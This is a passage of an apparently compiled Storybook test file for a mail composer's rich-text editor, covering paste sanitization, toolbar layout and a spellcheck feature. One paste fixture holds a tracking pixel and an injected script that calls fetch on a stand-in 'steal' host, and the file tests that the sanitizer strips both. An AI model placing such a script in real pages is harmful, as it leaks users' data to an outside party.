import{j as i,r as F}from"./iframe-BxLfZl0d.js";import{al as Y}from"./rich-text-document-CHtRrJWn.js";import{C as se}from"./compose-language-chip-qvHTikQz.js";import{C as ie}from"./compose-mode-toggle-BDvKH0Zt.js";import{n as le,R as K,f as ce}from"./rich-text-editor-DHv59lRM.js";import{o as V}from"./rich-text-spellcheck-worker-provider-cYJ1jC8c.js";import"./preload-helper-PPVm8Dsz.js";import"./purify.es-P3vI1IgJ.js";import"./cn-d2XQ1MEC.js";import"./compose-language-B4uv5zOH.js";import"./roving-focus-C9a9OTc4.js";import"./button-y3nctzTP.js";import"./index-7yp0vHVi.js";import"./index-CmfuxwI8.js";import"./use-match-media-PQnav3Jn.js";import"./bottom-sheet-B9Qz9meM.js";import"./popover-menu-wtYxHIzp.js";import"./createLucideIcon-DDkWk8mg.js";import"./eye-off-DeJR8Efh.js";import"./attachment-file-qTo3Y5Tj.js";import"./circle-alert-dyRtukXU.js";import"./loader-circle-tcZ5ujJC.js";import"./undo-2-CnFziX6B.js";const de=new Set(["a","again","agenda","and","are","attached","budget","confirm","figures","for","is","i","meeting","notes","report","schedule","separately","the","this","today","tomorrow","well","will"]),pe=e=>de.has(le(e)),{expect:n,userEvent:m,waitFor:r}=__STORYBOOK_MODULE_TEST__,_e={title:"Mail/RichTextEditor",component:K,parameters:{layout:"centered",docs:{description:{component:`The frame is the compose body region at its real geometry — a column with a
height of its own — so the editor is shown claiming the space a composer
gives it rather than only the space its own text needs.`}}},decorators:[e=>i.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[640px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:i.jsx(e,{})})]},W=["<h2>Quarterly numbers</h2>","<p>Highlights <strong>this quarter</strong>, with the detail below.</p>","<ul><li>Revenue up 14%</li><li>Costs flat</li></ul>","<table><thead><tr><th>Region</th><th>Total</th></tr></thead>","<tbody><tr><td>EMEA</td><td>412</td></tr>","<tr><td>Americas</td><td>388</td></tr></tbody></table>",'<p>Source: <a href="https://example.com/report">the full report</a>.</p>'].join(""),he=['<meta charset="utf-8">',"<!--[if gte mso 9]><xml><w:WordDocument/></xml><![endif]-->","<style>.hdr{color:#c00}</style>",'<h3 class="hdr" style="color:#c00;font-family:Verdana">Release checklist</h3>','<ol><li style="margin:0">Cut the tag</li><li>Publish the images</li></ol>','<table style="border:2px dashed #c00"><tbody>',"<tr><th>Step</th><th>Owner</th></tr>","<tr><td>Tag</td><td>Ada</td></tr></tbody></table>",'<img src="http://tracker.example/px.gif" width="1" height="1">','<script>fetch("https://tracker.example/steal")<\/script>'].join(""),me="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNDAiIGhlaWdodD0iMTIwIj48cmVjdCB3aWR0aD0iMjQwIiBoZWlnaHQ9IjEyMCIgcng9IjEyIiBmaWxsPSIjMzc4MGY2Ii8+PGNpcmNsZSBjeD0iNjAiIGN5PSI2MCIgcj0iMzIiIGZpbGw9IiNmZmYiLz48L3N2Zz4=",ue="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNjAwIiBoZWlnaHQ9IjQwMCI+PHJlY3Qgd2lkdGg9IjE2MDAiIGhlaWdodD0iNDAwIiBmaWxsPSIjZTJlOGYwIi8+PHRleHQgeD0iNDAiIHk9IjIyMCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iOTYiIGZpbGw9IiMzMzQxNTUiPjE2MDAgd2lkZTwvdGV4dD48L3N2Zz4=",ge=["<p>The new mark:</p>",`<p><img src="${me}" alt="The mark"></p>`,"<p>And the header it sits in:</p>",`<p><img src="${ue}" alt="The header, 1600 wide"></p>`,"<p>Let me know which one reads better.</p>"].join(""),N={name:"Empty",args:{}},R={name:"Rich content with a table",args:{initialHtml:W}},y={name:"After pasting a web page",args:{initialHtml:Y(he)}},b={name:"After pasting images",args:{initialHtml:Y(ge)},play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=compose-body]");if(!t)throw new Error("the editor is not mounted");const a=[...t.querySelectorAll("img")];await n(a).toHaveLength(2),await n(a[0]).toHaveAttribute("alt","The mark"),await r(()=>n(a.every(o=>o.naturalWidth>0)).toBe(!0)),await n(a[1].naturalWidth).toBe(1600);for(const o of a)await n(o.getBoundingClientRect().width).toBeGreaterThan(0),await n(o.getBoundingClientRect().width).toBeLessThanOrEqual(t.clientWidth)}},f={name:"Clicking below the last line",args:{initialHtml:"<p>Sounds good. See you at 12:30.</p>"},play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=body-area]"),a=e.querySelector("[data-testid=compose-body]");if(!t||!a)throw new Error("the editor is not mounted");const o=t.getBoundingClientRect(),s=document.elementFromPoint(o.left+o.width/2,Math.min(o.bottom-12,window.innerHeight-2));await n(a.contains(s)).toBe(!0),await m.click(a),await n(a).toHaveFocus()}},we=()=>{const[e,t]=F.useState("nl"),[a,o]=F.useState("rich");return i.jsxs(i.Fragment,{children:[i.jsx(se,{language:e,languages:["nl","en","de"],source:e==="nl"?"detected":"manual",onSelect:t}),i.jsx(ie,{mode:a,onToggle:()=>o(a==="plain"?"rich":"plain")})]})},G=i.jsx(we,{}),k={name:"Toolbar with the language chip and the mode toggle",args:{initialHtml:W,lang:"nl",trailing:G}},S={name:"Toolbar at 390",args:{initialHtml:W,lang:"nl",trailing:G},decorators:[e=>i.jsx("div",{"data-testid":"body-area",className:"flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas",children:i.jsx(e,{})})],play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=body-area]"),a=e.querySelector("[data-testid=compose-format-cluster]"),o=e.querySelector("[data-testid=compose-mode-toggle]"),s=e.querySelector("[data-testid=compose-language-chip]");if(!t||!a||!o||!s)throw new Error("the toolbar is not mounted");await n(a.scrollWidth).toBeGreaterThan(a.clientWidth);const d=t.getBoundingClientRect().right+1;await n(o.getBoundingClientRect().right).toBeLessThanOrEqual(d),await n(s.getBoundingClientRect().left).toBeGreaterThanOrEqual(t.getBoundingClientRect().left),await n(s.getBoundingClientRect().right).toBeLessThanOrEqual(d)}},p="Ths report is redy today, and the notes are attachd.",$="De vergaderingg gaat over de begrooting.",u={provider:V},ye=e=>({provider:async t=>({language:t,onStatus:a=>{a({state:"opening",language:t,bytesLoaded:0,bytesTotal:e});const o=setInterval(()=>a({state:"opening",language:t,bytesLoaded:Math.round(e/4),bytesTotal:e}),500);return()=>clearInterval(o)},check:a=>Promise.resolve({requestId:a.requestId,revision:a.revision,findings:[]}),suggest:a=>Promise.resolve({requestId:a.requestId,word:a.word,suggestions:[]}),close:()=>{}})}),be={provider:async e=>({language:e,onStatus:t=>(t({state:"failed",language:e,reason:"download",detail:`/spellcheck/dictionaries/${e}/index.dic answered 503`}),()=>{}),check:t=>Promise.resolve({requestId:t.requestId,revision:t.revision,findings:[]}),suggest:t=>Promise.resolve({requestId:t.requestId,word:t.word,suggestions:[]}),close:()=>{}})},X=[],fe={provider:async()=>({language:"en",onStatus:e=>(e({state:"ready",language:"en"}),()=>{}),check:e=>(X.push(e.requestId),Promise.resolve({requestId:e.requestId,revision:e.revision-1,findings:e.spans.flatMap(t=>ce(t.text,pe).map(a=>({spanId:t.spanId,start:a.start,end:a.end,kind:"spelling",suggestions:[]})))})),suggest:e=>Promise.resolve({requestId:e.requestId,word:e.word,suggestions:[]}),close:()=>{}})},l=e=>{const t=[];return CSS.highlights.forEach((a,o)=>{o==="spell-error"&&a.forEach(s=>{e.contains(s.startContainer)&&t.push(s)})}),t},w=e=>l(e).map(t=>[t.startOffset,t.endOffset]),c=e=>{const t=e.querySelector("[data-testid=compose-body]");if(!t)throw new Error("the editor is not mounted");return t},x={name:"Spellcheck marks (worker provider)",args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:u},play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(w(t)).toEqual([[0,3],[14,18],[44,51]]),{timeout:5e3}),await n(t.getAttribute("spellcheck")).toBe("false"),await n(t.textContent).toBe(p),await n(t.querySelectorAll("[data-lexical-text]")).toHaveLength(1),t.focus(),U(t,17),await r(()=>n(w(t)).toEqual([[0,3],[44,51]]),{timeout:5e3})}},v={name:"Spellcheck in Dutch (real dictionary)",args:{initialHtml:`<p>${$}</p>`,lang:"nl",spellcheck:u},play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(w(t)).toEqual([[3,15],[29,39]]),{timeout:15e3}),await n(t.getAttribute("spellcheck")).toBe("false")}},E={name:"Spellcheck while the dictionary downloads",args:{initialHtml:`<p>${$}</p>`,lang:"nl",spellcheck:ye(702464)},play:async({canvasElement:e})=>{const t=c(e);await n(t.getAttribute("spellcheck")).toBe("true"),await n(l(t)).toHaveLength(0);const a=await r(()=>{const s=e.querySelector("[data-testid=spellcheck-notice]");return n(s).not.toBeNull(),s},{timeout:12e3});await n(a.textContent).toContain("Nederlands"),await n(a.textContent).toContain("686 KB");const o=a.querySelector("[data-testid=spellcheck-cancel]");if(!o)throw new Error("a download nobody can stop is not a download");await m.click(o),await r(()=>n(e.querySelector("[data-testid=spellcheck-retry]")).not.toBeNull()),await n(t.getAttribute("spellcheck")).toBe("true")}},T={name:"Spellcheck when the dictionary fails to load",args:{initialHtml:`<p>${$}</p>`,lang:"nl",spellcheck:be},play:async({canvasElement:e})=>{const t=c(e),a=await r(()=>{const s=e.querySelector("[data-testid=spellcheck-detail]");return n(s).not.toBeNull(),s});await n(a.textContent).toContain("answered 503"),await n(e.querySelector("[data-testid=spellcheck-retry]")).not.toBeNull();const o=e.querySelector("[data-testid=spellcheck-report]");await n(o?.href).toContain("issues/new?title="),await n(t.getAttribute("spellcheck")).toBe("true"),await n(l(t)).toHaveLength(0)}},B={name:"Spellcheck with no dictionary for the language",args:{initialHtml:"<p>Vielen Dank für den Bericht.</p>",lang:"de",spellcheck:u},play:async({canvasElement:e})=>{const t=c(e);await n(t.getAttribute("spellcheck")).toBe("true"),await n(l(t)).toHaveLength(0)}},C={name:"Spellcheck drops a stale answer",args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:fe},play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(X.length).toBeGreaterThan(0),{timeout:5e3}),await n(l(t)).toHaveLength(0),await n(t.textContent).toBe(p)}},J=["Ths is the agenda for tomorow.","I attachd the budgt figures and the meetign notes,","and will confrm the schedual seperately."].join(" "),ee=(e,t)=>({onAddWord:t,provider:async a=>{const o=await V(a);return o?{...o,suggest:s=>new Promise(d=>{setTimeout(()=>d(o.suggest(s)),e)})}:null}}),_=(e,t)=>{for(const a of l(e))if((a.startContainer.textContent??"").slice(a.startOffset,a.endOffset)===t)return a.getBoundingClientRect();throw new Error(`"${t}" carries no mark`)},z=e=>({clientX:e.left+e.width/2,clientY:e.top+e.height/2}),te=(e,t,{pointerType:a="mouse",button:o=0}={})=>{e.dispatchEvent(new PointerEvent("pointerdown",{bubbles:!0,pointerType:a,button:o,...z(_(e,t))}))},ae=(e,t,{pointerType:a="mouse",travel:o=0,button:s=0}={})=>{const d=z(_(e,t));e.dispatchEvent(new PointerEvent("pointerup",{bubbles:!0,pointerType:a,button:s,...d,clientX:d.clientX+o}))},O=(e,t,a={})=>{te(e,t,a),ae(e,t,a)},ne=(e,t)=>O(e,t,{pointerType:"touch"}),Z=(e,t)=>O(e,t),U=(e,t)=>{const a=e.querySelector("[data-lexical-text]");e.ownerDocument.getSelection()?.setPosition(a?.firstChild??null,t)},oe=e=>e.querySelector("[data-lexical-text]")?.textContent??"",Q=(e,t)=>U(e,oe(e).indexOf(t)+1),ke=e=>U(e,oe(e).length),j=(e,t)=>[...e.ownerDocument.body.querySelectorAll(`[data-testid=${t}]`)],h=(e,t)=>e.ownerDocument.body.querySelector(t),H={name:"Spellcheck suggestions",args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:ee(600)},play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(l(t).length).toBe(3),{timeout:5e3}),Z(t,"attachd"),await r(()=>n(h(e,"[data-testid=spell-menu]")).toBeTruthy()),await n(j(e,"spell-suggestion-skeleton")).toHaveLength(3),await r(()=>n(j(e,"spell-suggestion").map(o=>o.textContent)).toEqual(["attach","attached","attache","attach d"]),{timeout:5e3});const a=j(e,"spell-suggestion").find(o=>o.textContent==="attached");if(!a)throw new Error("no suggestion to pick");await m.click(a),await n(t.textContent).toBe(p.replace("attachd","attached")),await r(()=>n(l(t).length).toBe(2),{timeout:5e3}),t.focus(),await m.keyboard("{Control>}z{/Control}"),await r(()=>n(t.textContent).toBe(p),{timeout:5e3})}},M={name:"Spellcheck menu at the right edge of a narrow editor",args:{initialHtml:`<p>${J}</p>`,lang:"en",spellcheck:u},decorators:[e=>i.jsx("div",{"data-testid":"body-area",className:"flex h-[260px] w-[320px] flex-col overflow-hidden rounded-md border border-line bg-canvas",children:i.jsx(e,{})})],play:async({canvasElement:e})=>{const t=c(e),a=e.querySelector("[data-testid=body-area]");if(!a)throw new Error("the narrow frame is not mounted");await r(()=>n(l(t).length).toBeGreaterThan(0),{timeout:5e3}),Z(t,"confrm");const o=await r(()=>{const d=h(e,"[data-testid=spell-menu]");if(!d)throw new Error("the menu has not opened yet");return d});await n(a.contains(o)).toBe(!1);const s=o.getBoundingClientRect();await n(s.left).toBeGreaterThanOrEqual(0),await n(s.right).toBeLessThanOrEqual(window.innerWidth),await n(h(e,"[data-testid=spell-ignore]")?.textContent).toBe("Ignore for now")}},I={name:"Spellcheck ignores a word for the session",args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:u},play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(l(t).length).toBe(3),{timeout:5e3}),Z(t,"attachd");const[a]=await r(()=>{const o=j(e,"spell-ignore");return n(o).toHaveLength(1),o});if(!a)throw new Error("the menu offers no way to ignore");await m.click(a),await r(()=>n(l(t).length).toBe(2)),t.focus(),ke(t),await m.keyboard(" Attachd again."),await r(()=>n(l(t).filter(o=>(o.startContainer.textContent??"").slice(o.startOffset,o.endOffset).toLowerCase()==="attachd")).toHaveLength(0),{timeout:5e3})}},L={name:"Spellcheck opens on a click",args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:u},play:async({canvasElement:e})=>{const t=c(e),a=[[0,3],[14,18],[44,51]];await r(()=>n(w(t)).toEqual(a),{timeout:5e3}),t.focus(),te(t,"redy"),Q(t,"redy"),ae(t,"redy"),await r(()=>n(h(e,"[data-testid=spell-word]")?.textContent).toBe("redy")),await new Promise(o=>setTimeout(o,600)),await n(w(t)).toEqual(a),await m.keyboard("{Escape}"),await r(()=>n(h(e,"[data-testid=spell-menu]")).toBeNull()),Q(t,"redy"),t.dispatchEvent(new KeyboardEvent("keydown",{key:"ArrowLeft",bubbles:!0})),await r(()=>n(w(t)).toEqual([[0,3],[44,51]]),{timeout:5e3})}},g={name:"Spellcheck corrections on a phone",globals:{viewport:{value:"mobile"}},args:{initialHtml:`<p>${p}</p>`,lang:"en",spellcheck:u},decorators:[e=>i.jsx("div",{"data-testid":"body-area",className:"relative flex h-[560px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas",children:i.jsx(e,{})})],play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(l(t).length).toBe(3),{timeout:5e3}),ne(t,"redy"),await r(()=>n(h(e,"[data-testid=spell-menu]")).toBeTruthy()),await n(h(e,"[aria-label='Close corrections']")).toBeTruthy()}},q={...g,name:"Spellcheck leaves a drag and the right button alone",play:async({canvasElement:e})=>{const t=c(e);await r(()=>n(l(t).length).toBe(3),{timeout:5e3});const a=()=>h(e,"[data-testid=spell-menu]");O(t,"redy",{pointerType:"touch",travel:40}),await n(a()).toBeNull(),O(t,"redy",{travel:40}),await n(a()).toBeNull(),O(t,"redy",{button:2}),await n(a()).toBeNull();const o=new MouseEvent("contextmenu",{bubbles:!0,cancelable:!0,...z(_(t,"redy"))});t.dispatchEvent(o),await n(o.defaultPrevented).toBe(!1),await n(a()).toBeNull(),ne(t,"redy"),await r(()=>n(a()).toBeTruthy()),await m.click(h(e,"[aria-label='Close corrections']")),await r(()=>n(a()).toBeNull()),await r(()=>n(document.activeElement).toBe(t))}},re=()=>{const[e,t]=F.useState([]),a=F.useMemo(()=>ee(450,o=>t(s=>[...s,o])),[]);return i.jsxs(i.Fragment,{children:[i.jsx(K,{initialHtml:`<p>${J}</p><p>Anything you type here is checked the same way.</p>`,lang:"en",spellcheck:a,trailing:G}),i.jsx("p",{"data-testid":"spell-added-words",className:"shrink-0 border-t border-line px-3 py-2 text-xs text-fg-subtle",children:e.length===0?"Added to the dictionary: nothing yet.":`Added to the dictionary: ${e.join(", ")}.`})]})},P={name:"Spellcheck playground",render:()=>i.jsx(re,{})},D={name:"Spellcheck playground on a phone",globals:{viewport:{value:"mobile"}},render:()=>i.jsx(re,{}),decorators:[e=>i.jsx("div",{"data-testid":"body-area",className:"relative flex h-[640px] w-[360px] flex-col overflow-hidden rounded-md border border-line bg-canvas",children:i.jsx(e,{})})]},A={name:"Toolbar over a scrolled body",args:{initialHtml:`${W}${"<p>Another line of the message.</p>".repeat(30)}`,lang:"nl",trailing:G},play:async({canvasElement:e})=>{const t=e.querySelector("[data-testid=body-area]"),a=e.querySelector("[data-testid=compose-mode-toggle]");if(!t||!a)throw new Error("the toolbar is not mounted");t.scrollTop=400,await n(t.scrollTop).toBeGreaterThan(0),await n(a.getBoundingClientRect().top-t.getBoundingClientRect().top).toBeLessThan(60)}};N.parameters={...N.parameters,docs:{...N.parameters?.docs,source:{originalSource:`{
  name: "Empty",
  args: {}
}`,...N.parameters?.docs?.source}}};R.parameters={...R.parameters,docs:{...R.parameters?.docs,source:{originalSource:`{
  name: "Rich content with a table",
  args: {
    initialHtml: RICH_DOCUMENT
  }
}`,...R.parameters?.docs?.source}}};y.parameters={...y.parameters,docs:{...y.parameters?.docs,source:{originalSource:`{
  name: "After pasting a web page",
  args: {
    initialHtml: sanitizeAdoptedHtml(CLIPBOARD_HTML)
  }
}`,...y.parameters?.docs?.source},description:{story:`The document after that clipboard has gone through the paste profile: the
heading, the list and the table survive; the styling, the pixel and the
script do not.`,...y.parameters?.docs?.description}}};b.parameters={...b.parameters,docs:{...b.parameters?.docs,source:{originalSource:`{
  name: "After pasting images",
  args: {
    initialHtml: sanitizeAdoptedHtml(CLIPBOARD_WITH_IMAGES)
  },
  play: async ({
    canvasElement
  }) => {
    const editable = canvasElement.querySelector<HTMLElement>("[data-testid=compose-body]");
    if (!editable) throw new Error("the editor is not mounted");
    const images = [...editable.querySelectorAll("img")];
    await expect(images).toHaveLength(2);
    await expect(images[0]).toHaveAttribute("alt", "The mark");

    // A width read before the picture decodes is 0, and 0 is under every
    // bound this would like to assert.
    await waitFor(() => expect(images.every(image => image.naturalWidth > 0)).toBe(true));
    await expect(images[1].naturalWidth).toBe(1600);
    for (const image of images) {
      await expect(image.getBoundingClientRect().width).toBeGreaterThan(0);
      await expect(image.getBoundingClientRect().width).toBeLessThanOrEqual(editable.clientWidth);
    }
  }
}`,...b.parameters?.docs?.source},description:{story:`The pictures are in the document rather than gone from it (#684), and the
oversized one is drawn at the width the composer has rather than pushing the
message sideways. Whether a \`data:\` image survives the trip to a given
recipient is a separate question, and #679 is where it is answered.`,...b.parameters?.docs?.description}}};f.parameters={...f.parameters,docs:{...f.parameters?.docs,source:{originalSource:`{
  name: "Clicking below the last line",
  args: {
    initialHtml: "<p>Sounds good. See you at 12:30.</p>"
  },
  play: async ({
    canvasElement
  }) => {
    const area = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const editable = canvasElement.querySelector<HTMLElement>("[data-testid=compose-body]");
    if (!area || !editable) throw new Error("the editor is not mounted");
    const box = area.getBoundingClientRect();
    const underTheText = document.elementFromPoint(box.left + box.width / 2, Math.min(box.bottom - 12, window.innerHeight - 2));
    await expect(editable.contains(underTheText)).toBe(true);
    await userEvent.click(editable);
    await expect(editable).toHaveFocus();
  }
}`,...f.parameters?.docs?.source},description:{story:`A short message leaves most of the body region empty. That region belongs to
the document: the point far below the last line is the editable, and a click
there lands in it.`,...f.parameters?.docs?.description}}};k.parameters={...k.parameters,docs:{...k.parameters?.docs,source:{originalSource:`{
  name: "Toolbar with the language chip and the mode toggle",
  args: {
    initialHtml: RICH_DOCUMENT,
    lang: "nl",
    trailing: pinnedControls
  }
}`,...k.parameters?.docs?.source},description:{story:"The toolbar as compose ships it: the formatting cluster, then the two pinned controls.",...k.parameters?.docs?.description}}};S.parameters={...S.parameters,docs:{...S.parameters?.docs,source:{originalSource:`{
  name: "Toolbar at 390",
  args: {
    initialHtml: RICH_DOCUMENT,
    lang: "nl",
    trailing: pinnedControls
  },
  decorators: [Story => <div data-testid="body-area" className="flex h-[420px] w-[390px] flex-col overflow-auto rounded-md border border-line bg-canvas">
                <Story />
            </div>],
  play: async ({
    canvasElement
  }) => {
    const frame = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    const cluster = canvasElement.querySelector<HTMLElement>("[data-testid=compose-format-cluster]");
    const toggle = canvasElement.querySelector<HTMLElement>("[data-testid=compose-mode-toggle]");
    const chip = canvasElement.querySelector<HTMLElement>("[data-testid=compose-language-chip]");
    if (!frame || !cluster || !toggle || !chip) throw new Error("the toolbar is not mounted");
    await expect(cluster.scrollWidth).toBeGreaterThan(cluster.clientWidth);
    const edge = frame.getBoundingClientRect().right + 1;
    await expect(toggle.getBoundingClientRect().right).toBeLessThanOrEqual(edge);
    await expect(chip.getBoundingClientRect().left).toBeGreaterThanOrEqual(frame.getBoundingClientRect().left);
    await expect(chip.getBoundingClientRect().right).toBeLessThanOrEqual(edge);
  }
}`,...S.parameters?.docs?.source},description:{story:`At 390 the formatting cluster runs out of room. It scrolls inside its own
strip and both pinned controls stay at the right edge, rather than the
cluster pushing them off the screen — which is what a flex child without
\`min-w-0\` does. Two letters is what makes room for a second pinned item here.`,...S.parameters?.docs?.description}}};x.parameters={...x.parameters,docs:{...x.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck marks (worker provider)",
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: workerSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarkOffsets(editable)).toEqual([[0, 3], [14, 18], [44, 51]]), {
      timeout: 5000
    });
    await expect(editable.getAttribute("spellcheck")).toBe("false");
    await expect(editable.textContent).toBe(MISSPELT);
    await expect(editable.querySelectorAll("[data-lexical-text]")).toHaveLength(1);

    // The word the caret sits in is left alone until the writer moves on.
    editable.focus();
    caretTo(editable, 17);
    await waitFor(() => expect(spellMarkOffsets(editable)).toEqual([[0, 3], [44, 51]]), {
      timeout: 5000
    });
  }
}`,...x.parameters?.docs?.source},description:{story:`The marks a provider produced, drawn through the CSS Custom Highlight
registry: two misspelt words carry a squiggle, the browser's own checking is
off while ours is on, and the document holds nothing that was not typed.`,...x.parameters?.docs?.description}}};v.parameters={...v.parameters,docs:{...v.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck in Dutch (real dictionary)",
  args: {
    initialHtml: \`<p>\${DUTCH}</p>\`,
    lang: "nl",
    spellcheck: workerSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarkOffsets(editable)).toEqual([[3, 15], [29, 39]]), {
      timeout: 15000
    });
    await expect(editable.getAttribute("spellcheck")).toBe("false");
  }
}`,...v.parameters?.docs?.source},description:{story:`The same worker on a Dutch message, against OpenTaal's 180,745 entries. Two
Dutch misspellings carry a squiggle and every other Dutch word does not —
which is the whole point, since a Dutch message in an English-configured
Chrome gets a squiggle under every word.`,...v.parameters?.docs?.description}}};E.parameters={...E.parameters,docs:{...E.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck while the dictionary downloads",
  args: {
    initialHtml: \`<p>\${DUTCH}</p>\`,
    lang: "nl",
    spellcheck: stalledSpellcheck(702_464)
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await expect(editable.getAttribute("spellcheck")).toBe("true");
    await expect(spellMarks(editable)).toHaveLength(0);
    const notice = await waitFor(() => {
      const row = canvasElement.querySelector<HTMLElement>("[data-testid=spellcheck-notice]");
      expect(row).not.toBeNull();
      return row as HTMLElement;
    }, {
      timeout: 12000
    });
    await expect(notice.textContent).toContain("Nederlands");
    await expect(notice.textContent).toContain("686 KB");
    const cancel = notice.querySelector<HTMLElement>("[data-testid=spellcheck-cancel]");
    if (!cancel) throw new Error("a download nobody can stop is not a download");
    await userEvent.click(cancel);
    await waitFor(() => expect(canvasElement.querySelector("[data-testid=spellcheck-retry]")).not.toBeNull());
    await expect(editable.getAttribute("spellcheck")).toBe("true");
  }
}`,...E.parameters?.docs?.source},description:{story:`Fourteen seconds of a composer that looks like it has no opinion about
spelling is the failure this must not have. The browser keeps checking, the
banner names the language and its size once the wait is long enough to be
worth mentioning, and cancelling leaves the writer with a way back.`,...E.parameters?.docs?.description}}};T.parameters={...T.parameters,docs:{...T.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck when the dictionary fails to load",
  args: {
    initialHtml: \`<p>\${DUTCH}</p>\`,
    lang: "nl",
    spellcheck: refusedSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    const detail = await waitFor(() => {
      const row = canvasElement.querySelector<HTMLElement>("[data-testid=spellcheck-detail]");
      expect(row).not.toBeNull();
      return row as HTMLElement;
    });
    await expect(detail.textContent).toContain("answered 503");
    await expect(canvasElement.querySelector("[data-testid=spellcheck-retry]")).not.toBeNull();
    const report = canvasElement.querySelector<HTMLAnchorElement>("[data-testid=spellcheck-report]");
    await expect(report?.href).toContain("issues/new?title=");
    await expect(editable.getAttribute("spellcheck")).toBe("true");
    await expect(spellMarks(editable)).toHaveLength(0);
  }
}`,...T.parameters?.docs?.source},description:{story:`The dead squiggle-free editor is the worst outcome, so a failure says which
file, what it answered, and where to report it — and hands the spelling back
to the browser rather than leaving nobody checking.`,...T.parameters?.docs?.description}}};B.parameters={...B.parameters,docs:{...B.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck with no dictionary for the language",
  args: {
    initialHtml: \`<p>Vielen Dank für den Bericht.</p>\`,
    lang: "de",
    spellcheck: workerSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await expect(editable.getAttribute("spellcheck")).toBe("true");
    await expect(spellMarks(editable)).toHaveLength(0);
  }
}`,...B.parameters?.docs?.source},description:{story:"A language the build carries no dictionary for: the browser keeps checking.",...B.parameters?.docs?.description}}};C.parameters={...C.parameters,docs:{...C.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck drops a stale answer",
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: staleSpellcheck
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(staleAnswers.length).toBeGreaterThan(0), {
      timeout: 5000
    });
    await expect(spellMarks(editable)).toHaveLength(0);
    await expect(editable.textContent).toBe(MISSPELT);
  }
}`,...C.parameters?.docs?.source},description:{story:"An answer against a revision the document has moved past paints nothing.",...C.parameters?.docs?.description}}};H.parameters={...H.parameters,docs:{...H.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck suggestions",
  args: {
    initialHtml: \`<p>\${MISSPELT}</p>\`,
    lang: "en",
    spellcheck: slowSuggestions(600)
  },
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    await waitFor(() => expect(spellMarks(editable).length).toBe(3), {
      timeout: 5000
    });
    clickOn(editable, "attachd");
    await waitFor(() => expect(spellNode(canvasElement, "[data-testid=spell-menu]")).toBeTruthy());
    await expect(menuRows(canvasElement, "spell-suggestion-skeleton")).toHaveLength(3);

    // What Hunspell offers over SCOWL, in its own order. The word the writer
    // meant is in it, which is the whole reason for a real dictionary.
    await waitFor(() => expect(menuRows(canvasElement, "spell-suggestion").map(row => row.textContent)).toEqual(["attach", "attached", "attache", "attach d"]), {
      timeout: 5000
    });
    const meant = menuRows(canvasElement, "spell-suggestion").find(row => row.textContent === "attached");
    if (!meant) throw new Error("no suggestion to pick");
    await userEvent.click(meant);
    await expect(editable.textContent).toBe(MISSPELT.replace("attachd", "attached"));
    await waitFor(() => expect(spellMarks(editable).length).toBe(2), {
      timeout: 5000
    });
    editable.focus();
    await userEvent.keyboard("{Control>}z{/Control}");
    await waitFor(() => expect(editable.textContent).toBe(MISSPELT), {
      timeout: 5000
    });
  }
}`,...H.parameters?.docs?.source},description:{story:`The correction menu over a marked word: up on the click with rows standing in
for suggestions that have not arrived, filled when they do, and one undo away
from the word that was there before.`,...H.parameters?.docs?.description}}};M.parameters={...M.parameters,docs:{...M.parameters?.docs,source:{originalSource:`{
  name: "Spellcheck menu at the right edge of a narrow editor",
  args: {
    initialHtml: \`<p>\${MISSPELT_MESSAGE}</p>\`,
    lang: "en",
    spellcheck: workerSpellcheck
  },
  decorators: [Story => <div data-testid="body-area" className="flex h-[260px] w-[320px] flex-col overflow-hidden rounded-md border border-line bg-canvas">
                <Story />
            </div>],
  play: async ({
    canvasElement
  }) => {
    const editable = writingSurface(canvasElement);
    const frame = canvasElement.querySelector<HTMLElement>("[data-testid=body-area]");
    if (!frame) throw new Error("the narrow frame is not mounted");
    await waitFor(() => expect(spellMarks(editable).length).toBeGreaterThan(0), {
      timeout: 5000
    });
    clickOn(editable, "confrm");
    const menu = await waitFor(() => {
